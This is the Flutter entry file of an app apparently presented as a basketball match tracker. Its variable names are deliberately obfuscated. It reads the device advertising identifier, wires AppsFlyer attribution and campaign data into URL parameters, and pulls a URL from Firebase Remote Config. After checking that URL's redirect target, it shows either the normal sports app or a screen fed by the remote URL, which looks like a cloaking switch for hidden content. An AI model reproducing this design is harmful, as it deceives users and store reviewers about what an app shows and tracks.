import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:basket_test/features/match/api/firebase_options.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:hive_flutter/hive_flutter.dart';

import 'core/config/router.dart';
import 'core/config/themes.dart';
import 'core/models/match.dart';
import 'features/home/bloc/home_bloc.dart';
import 'features/match/api/match_api.dart';
import 'features/match/bloc/match_bloc.dart';

late AppsflyerSdk fsdfdsf;
String mfdks = '';
bool inias = false;
String mdjas = '';
String fnjksd = '';
String modaslmdsa = '';
String njfksd = '';
String dsfsdfdsf = '';
Map njdkasdnsajk = {};
String mklfsdlfsd = '';
Map njkfnsdkxkds = {};
bool fmjsdkfnjksd = false;
String mfkdmslksdf = '';
String ndjaksdnkas = '';
String lkfosdpfsd = '';
String mklfmsfsfdlsmflksdf = '';
String df = '';
String fmnsdjkfnsd = '';
String fsdfds = '';
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  fsdfdsfs();
  await Hive.initFlutter();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  // await Hive.deleteBoxFromDisk('matchesbox');
  Hive.registerAdapter(MatchModelAdapter());
  // init1();
  runApp(const MyApp());
}

Future<String> fsdfdsfs() async {
  String mfsdnjkfsd = await AppTrackingTransparency.getAdvertisingIdentifier();
  dsfsdfdsf = mfsdnjkfsd;
  return mfsdnjkfsd;
}

Future<void> init1() async {
  final AppsFlyerOptions nfjksdfkds = AppsFlyerOptions(
    showDebug: false,
    afDevKey: '',
    appId: '',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  fsdfdsf = AppsflyerSdk(nfjksdfkds);

  await fsdfdsf.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  fsdfdsf.onAppOpenAttribution((res) {
    // setState(() {
    //   mfklsdmfkldsf = res;
    //   modaslmdsa = res['payload']
    //       .entries
    //       .where((e) => ![
    //             'install_time',
    //             'click_time',
    //             'af_status',
    //             'is_first_launch'
    //           ].contains(e.key))
    //       .map((e) => '&${e.key}=${e.value}')
    //       .join();
    //   klmdaslmfdlsa = '&campaign=${res['campaign'] ?? ''}';
    //   lkfosdpfsd = '&media_source=${res['media_source'] ?? ''}';
    // });
  });

  fsdfdsf.onInstallConversionData((res) {
    njkfnsdkxkds = res;
    fmjsdkfnjksd = res['payload']['is_first_launch'];
    mfkdmslksdf = res['payload']['af_status'];
    mdjas = '&is_first_launch=$fmjsdkfnjksd&af_status=$mfkdmslksdf';
  });

  fsdfdsf.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    njdkasdnsajk = dp.toJson();
  });
  fsdfdsf.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<bool> getNews() async {
  final dasfdsfsd = FirebaseRemoteConfig.instance;
  await dasfdsfsd.fetchAndActivate();
  String fullasd = dasfdsfsd.getString('news');
  String dsdfas = dasfdsfsd.getString('full');
  njfksd = fullasd;
  fmnsdjkfnsd = dsdfas;
  final ndfkljss = HttpClient();
  final fsdko = Uri.parse(njfksd);
  final mmmdksa = await ndfkljss.getUrl(fsdko);
  mmmdksa.followRedirects = false;
  final response = await mmmdksa.close();
  if (response.headers.value(HttpHeaders.locationHeader) != fmnsdjkfnsd) {
    return true;
  }
  init1();
  return fullasd.contains('none') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiBlocProvider(
        providers: [
          BlocProvider(create: (context) => HomeBloc()),
          BlocProvider(create: (context) => MatchBloc()),
        ],
        child: FutureBuilder<bool>(
            future: getNews(),
            builder: (context, snapshot) {
              if (snapshot.connectionState == ConnectionState.waiting) {
                return Container(
                  color: Colors.white,
                );
              } else {
                if (snapshot.data == true && njfksd != '') {
                  return MaterialApp(
                    debugShowCheckedModeBanner: false,
                    home: MainScreen(
                      jdnkasdnkja: njfksd,
                      mjksdfn: mdjas,
                      data: fsdfds,
                      c1: ndjaksdnkas,
                      c2: lkfosdpfsd,
                    ),
                  );
                } else {
                  return MaterialApp.router(
                    debugShowCheckedModeBanner: false,
                    theme: theme,
                    routerConfig: routerConfig,
                  );
                }
              }
            }));
  }
}
